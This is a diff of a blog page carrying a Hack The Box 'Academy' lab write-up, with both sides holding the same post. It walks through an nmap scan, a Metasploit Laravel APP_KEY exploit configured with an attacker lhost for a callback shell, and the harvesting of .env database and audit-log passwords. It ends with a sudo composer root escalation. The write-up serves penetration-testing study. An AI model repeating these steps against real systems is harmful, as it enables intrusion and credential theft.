@@ -1,6 +1,125 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>HTB Academy Writeup · Ikonw</title><meta name="description" content="HTB Academy Writeup - Ikonw"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/gandalfr.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/solarized-light.min.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Ikonw"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
-</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="https://p4.itc.cn/q_70/images03/20230225/87c56a7134574d718cd48f0955a962f4.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><!-- Search Bar--><li style="margin-top: 10px;" class="nav-list-item"><form action="/search" method="GET"><input type="text" name="query" placeholder="Search" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-right: 5px; width: 200px;"><button type="submit" style="padding: 8px 12px; border: none; border-radius: 4px; background-color: #007bff; color: white; cursor: pointer;"> </button></form></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HTB Academy Writeup</h1><div class="tags"><a href="/tags/hackthebox/" class="tag-title">#hackthebox</a><a href="/tags/easy/" class="tag-title">#easy</a></div><div class="post-info">Nov 13, 2020</div><div class="post-content"><p><img src="/images/HTB-Academy/image-20201108123205427.png" alt="image-20201108123205427"></p>
-<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Making a script scan on all ports                                                              </span><br><span class="line">                                                                                               </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 11:27 +08                                </span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.20.117</span><br><span class="line">Host is up (0.27s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://academy.htb/</span><br><span class="line">33060/tcp open  mysqlx?</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port33060-TCP:V=7.80%I=7%D=11/8%Time=5FA765A9%P=x86_64-pc-linux-gnu%r(G</span><br><span class="line">SF:enericLines,9,<span class="string">&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;</span>);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 183.87 seconds</span><br></pre></td></tr></table></figure>
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport"content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes"/>
+  
+  
+  <title>  HTB Academy Writeup |   Ikonw </title>
+
+ 
+  
+    <link rel="icon" href="/images/favicon.png">
+  
+
+
+  
+<link rel="stylesheet" href="/nayo.min.css">
+ 
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
+</head>  
+  <body>   
+    
+      <header class="header-wrapper">
+  <nav class="inner">
+    <div class="title">
+      <a href="/">
+        <img class="logo" src="/images/logo.png" />
+      </a>
+    </div>
+
+    <ul class="menu">
+      <li class="item">
+        <a class="link" id="menu-home" href="/"> <!-- Home -->
+          <i class="iconfont icon-home"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
+          <i class="iconfont icon-archives"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
+          <i class="iconfont icon-tags"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-about" href="/about"> <!-- About -->
+          <i class="iconfont icon-about"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-search"> <!-- Search -->
+          <i class="iconfont icon-search"></i>
+        </a>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<header class="mobile-header-wrapper">
+  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
+</header>   
+
+      <div class="container">       
+          
+          
+            <div class="container-inner">  
+          
+
+          <article class="post slideDownMin">
+  
+	
+<div class="header">
+		<p class="title">	
+			HTB Academy Writeup
+		</p>
+		<div class="info">	
+			<time>
+				Nov 13, 2020
+			</time>
+
+			
+			
+				<i class="iconfont icon-words"></i>
+				<span class="words">3315
+				</span>
+			
+		</div>
+</div> 
+	
+
+    <script type="text/x-mathjax-config">
+        var post = document.getElementsByClassName("post")[0];  
+        MathJax.Hub.Config({
+            showProcessingMessages: false,
+            messageStyle: "none",    
+            tex2jax: {
+                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
+                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
+            },
+            "HTML-CSS": {            
+                showMathMenu: false
+            }
+        });
+        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
+    </script>
+    <style>.MathJax{outline:0;}</style>
+
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+ 
+
+	  <div class="typo post-content ">
+
+		
+
+			
+					<p><img src="/images/HTB-Academy/image-20201108123205427.png" alt="image-20201108123205427"></p>
+<span id="more"></span>
+<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Making a script scan on all ports                                                              </span><br><span class="line">                                                                                               </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 11:27 +08                                </span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.20.117</span><br><span class="line">Host is up (0.27s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://academy.htb/</span><br><span class="line">33060/tcp open  mysqlx?</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port33060-TCP:V=7.80%I=7%D=11/8%Time=5FA765A9%P=x86_64-pc-linux-gnu%r(G</span><br><span class="line">SF:enericLines,9,<span class="string">&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;</span>);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 183.87 seconds</span><br></pre></td></tr></table></figure>
 
 <p>As Usual, add the hostname to <code>/etc/hosts</code></p>
 <p>Visit the <code>academy.htb</code> site, only a background nothing clickable.</p>
@@ -24,20 +143,20 @@
 <p>Perform <code>searchsploit</code></p>
 <p><img src="/images/HTB-Academy/image-20201114144738918.png" alt="image-20201114144738918"></p>
 <p>we found a potential metasploitable CVE, it needs <code>APP_KEY</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> VHOST dev-staging-01.academy.htb</span><br><span class="line"><span class="built_in">set</span> APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line"><span class="built_in">set</span> rhosts academy.htb</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.14.2</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> VHOST dev-staging-01.academy.htb</span><br><span class="line"><span class="built_in">set</span> APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line"><span class="built_in">set</span> rhosts academy.htb</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.14.2</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/HTB-Academy/image-20201114144823687.png" alt="image-20201114144823687"></p>
 <p>And we got the <code>www-data</code></p>
 <p><img src="/images/HTB-Academy/image-20201114145230610.png" alt="image-20201114145230610"></p>
 <p>After searching around, found one password in <code>/var/www/html/academy/.env</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">APP_NAME=Laravel</span><br><span class="line">APP_ENV=<span class="built_in">local</span></span><br><span class="line">APP_KEY=<span class="built_in">base64</span>:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line">APP_DEBUG=<span class="literal">false</span></span><br><span class="line">APP_URL=http://localhost</span><br><span class="line"></span><br><span class="line">LOG_CHANNEL=stack</span><br><span class="line"></span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=academy</span><br><span class="line">DB_USERNAME=dev</span><br><span class="line">DB_PASSWORD=mySup3rP4s5w0rd!!</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">APP_NAME=Laravel</span><br><span class="line">APP_ENV=<span class="built_in">local</span></span><br><span class="line">APP_KEY=<span class="built_in">base64</span>:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line">APP_DEBUG=<span class="literal">false</span></span><br><span class="line">APP_URL=http://localhost</span><br><span class="line"></span><br><span class="line">LOG_CHANNEL=stack</span><br><span class="line"></span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=academy</span><br><span class="line">DB_USERNAME=dev</span><br><span class="line">DB_PASSWORD=mySup3rP4s5w0rd!!</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>By looking at the <code>/home</code> directory, we have total of 6 user</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@academy:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@academy:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n</span><br></pre></td></tr></table></figure>
 
 <p>With trial and error, we manage to su as <code>cry0l1t3</code> or you can just SSH in to get a proper shell</p>
 <p><img src="/images/HTB-Academy/image-20201114145659590.png" alt="image-20201114145659590"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1002(cry0l1t3) gid=1002(cry0l1t3) <span class="built_in">groups</span>=1002(cry0l1t3),4(adm)</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1002(cry0l1t3) gid=1002(cry0l1t3) <span class="built_in">groups</span>=1002(cry0l1t3),4(adm)</span><br></pre></td></tr></table></figure>
 
 <p>Found <code>cry0l1ts</code> is in <code>adm</code> group. With a bit of google </p>
 <blockquote>
@@ -45,12 +164,12 @@
 </blockquote>
 <p>Tons of log event are recorded, with help of some kind soul.</p>
 <p>manage to find the right one</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span>=TTY msg=audit(1597199293.906:84): <span class="built_in">tty</span> pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 <span class="built_in">comm</span>=<span class="string">&quot;su&quot;</span> data=6D7262336E5F41634064336D79210A</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>=TTY msg=audit(1597199293.906:84): <span class="built_in">tty</span> pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 <span class="built_in">comm</span>=<span class="string">&quot;su&quot;</span> data=6D7262336E5F41634064336D79210A</span><br></pre></td></tr></table></figure>
 
 <p>Decode the hex character and we got <code>mrb3n_Ac@d3my!</code></p>
 <p>Again trial and error we are able login to <code>mrb3n</code></p>
 <p>perform <code>sudo -l</code> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l </span><br><span class="line">[sudo] password for mrb3n: </span><br><span class="line">Matching Defaults entries for mrb3n on academy:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User mrb3n may run the following commands on academy:</span><br><span class="line">    (ALL) /usr/bin/composer</span><br></pre></td></tr></table></figure>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo -l </span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">mrb3n:</span> </span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> mrb3n on <span class="symbol">academy:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span>\<span class="symbol">:/snap/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> mrb3n may run the following commands on <span class="symbol">academy:</span></span><br><span class="line">    (<span class="title class_">ALL</span>) /usr/bin/composer</span><br></pre></td></tr></table></figure>
 
 <p>Search <code>gtfobin</code></p>
 <p>and we got a easy root.</p>
@@ -59,4 +178,196 @@
 <br/>
 
 <p><img src="/images/root.gif" alt="root"></p>
-</div></article></div></main><footer><div class="paginator"><a href="/2022/04/12/osep_review/" class="prev">PREV</a><a href="/2020/11/07/HTB-Time/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 - 2023 <a href="http://example.com">Ikonw</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/MikeCoder/hexo-theme-gandalfr" target="_blank">hexo-theme-gandalfr</a>.</p></div></footer></div><script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js" crossorigin="anonymous"></script><script src="//cdn.bootcss.com/jquery/3.1.1/jquery.js" crossorigin="anonymous"></script><script>$(document).ready(function() { hljs.configure({useBR: true}); $('pre').each(function(i, block) { hljs.highlightBlock(block); }); });</script></body></html>
+  	
+					
+	  </div>     
+	  
+
+	<div class="bottom">
+  <div class="other">
+    <div class="meta">
+      
+      <i class="iconfont icon-category"></i>
+      <a class="category-link" href="/categories/hackthebox/">hackthebox</a>
+
+      
+
+      
+      <i class="iconfont icon-tag"></i>
+      <a class="tag-none-link" href="/tags/easy/" rel="tag">easy</a> <a class="tag-none-link" href="/tags/hackthebox/" rel="tag">hackthebox</a>
+      
+    </div>
+
+    <div class="operate">
+      
+      <span class="text">Share</span>
+      <ul class="share">
+	   			             
+        <li class="iconfont 
+		icon-share-weixin 
+		-mob-share-weixin 
+		item"
+		></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-twitter 
+		-mob-share-twitter 
+		item"
+		></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-google 
+		-mob-share-google 
+		item"
+		></li>		
+   	   
+</ul>	
+
+<script id="-mob-share" 
+src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+      
+    </div>
+  </div>
+
+
+  
+  <nav class="nav">
+    <div class="link">
+      
+      <a href="/2020/11/07/HTB-Time/" class="link-wrap">
+        <strong class="caption">older</strong>
+        
+        <span class="title">
+          HTB Time Writeup
+        </span>
+      </a>
+      
+    </div>
+    <div class="link">
+      
+      <a href="/2022/04/12/osep_review/" class="link-wrap">
+        <strong class="caption">newer</strong>
+        
+        <span class="title">
+          OSEP REVIEW
+        </span>
+      </a>
+      
+    </div>
+  </nav>
+  
+</div> 
+	
+<div class="comment">
+
+    
+
+    <div id="comment">
+    </div>
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+
+    <script src='//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js'></script>
+
+    <script>
+        new Valine({
+            el: '#comment',
+            notify: false,
+            verify: false,
+            app_id: 'cFM0eCo0CQ9xmBXmHi1eltol-gzGzoHsz',
+            app_key: 'oh9tizsnvV2vNvWgqEvoNtQO',
+            path: window.location.pathname,
+            avatar: 'mm',
+            guest_info: ['nick', 'mail']
+        });
+    </script>
+    
+</div>	
+</article>
+
+          </div> 
+      </div>            
+    
+        <i id="toTop" class="iconfont icon-backtotop"></i>
+
+  
+    <div class="none" id="search">
+    <div class="header">
+        <input type="text" 
+        placeholder="Typing Something here." 
+        id="search-input" 
+        class="input" />
+        
+        <i id="search-cancel" class="iconfont icon-cancel"></i>
+    </div>
+
+    <div id="search-result" class="result"></div>
+</div>
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon" src= "/images/favicon.png" >  
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">Home
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">Archives
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">Tags
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">About
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
+            
+         
+      
+</div>
+        
+    
+
+
+
+     
+    
+
+
+<footer class="footer">
+	<div class="inner">
+		<div class="copyright">
+			&copy;
+			
+			2019 -
+			
+			2023
+			Ikonw
+
+			<br/>
+			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
+		</div>
+	</div>
+</footer>   
+
+    
+<script src="/nayo.bundle.js"></script>
+           
+  </body>        
+</html>
